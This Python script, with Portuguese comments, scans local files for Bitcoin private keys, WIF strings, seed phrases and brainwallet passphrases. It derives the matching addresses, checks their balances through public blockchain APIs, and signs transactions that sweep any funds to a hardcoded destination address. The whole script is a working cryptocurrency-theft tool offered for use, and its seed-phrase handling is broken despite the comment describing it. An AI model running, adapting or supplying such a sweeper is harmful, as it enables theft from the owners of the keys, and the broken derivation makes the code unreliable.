import requests
import re
import time
import sys
import hashlib
from bitcoinlib.keys import Key
from bitcoinlib.transactions import Transaction
from bitcoinlib.mnemonic import Mnemonic

# --- CONFIGURAÇÕES ---
DEST_ADDRESS = 'bc1q0eej43uwaf0fledysymh4jm32h8jadnmqm8lgk'
FILES_TO_SCAN = ['privatekeys.txt', 'priv.key.rtf', 'chavprivelet1.txt', 'chaves_extraidas_e_enderecos_1.txt']

def check_balance_api(address):
    for api_url in [f"https://mempool.space/api/address/{address}", f"https://blockstream.info/api/address/{address}"]:
        try:
            r = requests.get(api_url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                stats = data.get('chain_stats', {})
                return stats.get('funded_txo_sum', 0) - stats.get('spent_txo_sum', 0)
        except: continue
    return 0

def create_hex_transaction(addr, wif, utxos_val):
    try:
        r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=15)
        utxos = r.json()
        if not utxos: return
        tx = Transaction(network='bitcoin')
        fee = 35000
        amount = utxos_val - fee
        if amount > 1000:
            for u in utxos:
                tx.add_input(prev_txid=u['txid'], output_n=u['vout'], value=u['value'], address=addr)
            tx.add_output(value=amount, address=DEST_ADDRESS)
            tx.sign([wif])
            print(f"HEX_GEN:{tx.raw_hex()}")
            sys.stdout.flush()
    except Exception: pass

def process_key(key_material, is_seed=False):
    """Testa derivações para uma chave ou semente"""
    try:
        # Se for semente BIP39, gera a chave privada da conta 0
        if is_seed:
            kb = Key(key_material, network='bitcoin')
        else:
            kb = Key(key_material, network='bitcoin')

        for comp in [True, False]:
            k = Key(kb.private_byte, network='bitcoin', compressed=comp)
            for addr_type in ['legacy', 'p2sh-segwit', 'segwit']:
                addr = k.address(witness_type=addr_type if addr_type != 'legacy' else None)
                balance = check_balance_api(addr)
                if balance > 0:
                    print(f"💰 SUCESSO! Endereço: {addr} | Saldo: {balance}")
                    print(f"🔑 Origem: {key_material[:15]}...")
                    create_hex_transaction(addr, k.wif(), balance)
                    sys.stdout.flush()
    except: pass

def run_ultra_scan():
    print("🚀 INICIANDO ULTRA SCAN: BIP39 + BRAIN + HEX + WIF")
    sys.stdout.flush()
    
    potential_stuff = set()
    
    for file_path in FILES_TO_SCAN:
        try:
            with open(file_path, 'r', errors='ignore') as f:
                content = f.read()
                # 1. Captura frases de 12-24 palavras (BIP39)
                words = re.findall(r'\b(?:[a-z]{3,10}\s+){11,23}[a-z]{3,10}\b', content.lower())
                for w in words: potential_stuff.add(('bip39', w))
                
                # 2. Captura HEX e WIF
                for h in re.findall(r'[0-9a-fA-F]{64}', content): potential_stuff.add(('hex', h))
                for wif in re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content): potential_stuff.add(('wif', wif))
                
                # 3. Brainwallet de cada linha não vazia
                for line in content.splitlines():
                    line = line.strip()
                    if len(line) > 5: potential_stuff.add(('brain', line))
        except: continue

    print(f"📊 Itens para processar: {len(potential_stuff)}")
    sys.stdout.flush()

    for type, value in potential_stuff:
        if type == 'bip39':
            process_key(value, is_seed=True)
        elif type == 'hex':
            process_key(bytes.fromhex(value))
        elif type == 'wif':
            process_key(value)
        else: # Brainwallet
            process_key(hashlib.sha256(value.encode()).digest())
        time.sleep(0.01)

if __name__ == "__main__":
    run_ultra_scan()
